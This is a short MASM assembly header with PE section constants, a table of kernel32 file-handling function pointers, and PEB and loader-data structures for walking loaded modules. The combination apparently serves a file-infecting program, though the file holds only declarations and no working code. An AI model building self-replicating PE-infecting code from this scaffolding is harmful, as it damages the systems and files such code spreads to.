hSizeOfHeaders                                        equ     200h
hVirtualAddress                                       equ     1000h
hVirtualSize                                          equ     1000h            ;aligned value only
hPointerToRawData                                     equ     200h
hSizeOfRawData                                        equ     400h

mapStack struct
    kWriteFile         DWORD ?
    kSetFilePointer    DWORD ?
    kReadFile          DWORD ?
    kGlobalFree        DWORD ?
    kGlobalAlloc       DWORD ?
    kFindNextFileA     DWORD ?
    kFindFirstFileA    DWORD ?
    kFindClose         DWORD ?
    kCreateFileA       DWORD ?
    kCloseHandle       DWORD ?
mapStack ends

WIN32_FIND_DATA struct
    dwFileAttributes  DWORD ?
    ftCreationTime    QWORD ?
    ftLastAccessTime  QWORD ?
    ftLastWriteTime   QWORD ?
    nFileSizeHigh     DWORD ?
    nFileSizeLow      DWORD ?
    dwReserved0       DWORD ?
    dwReserved1       DWORD ?
    cFileName         BYTE  260 dup (?)
    cAlternate        BYTE  0eh dup (?)
WIN32_FIND_DATA ends

LIST_ENTRY struct
    FLink  DWORD ?
    BLink  DWORD ?	
LIST_ENTRY ends

_PEB_LDR_DATA struct
    dwLength                           DWORD ?
    bInitialized                       DWORD ?
    dwSsHandle                         DWORD ?
    dwInLoadOrderModuleList            LIST_ENTRY <?>
    dwInMemoryOrderModuleList          LIST_ENTRY <?>
    dwInInitializationOrderModuleList  LIST_ENTRY <?>
_PEB_LDR_DATA ends

PROCESS_ENVIRONMENT_BLOCK struct
	bInhiritedAddressSpace     BYTE  ?
	bReadImageFileExecOptions  BYTE  ?
	bBeingDebugged             BYTE  ?
	bSpare                     BYTE  ?
	hMutant                    DWORD ?
	dwImageBaseAddress         DWORD ?
	lpLoaderData               DWORD ?
	lpProcessParameters        DWORD ?
PROCESS_ENVIRONMENT_BLOCK ends

include windows.inc
include user32.inc
include kernel32.inc

includelib user32.lib
includelib kernel32.lib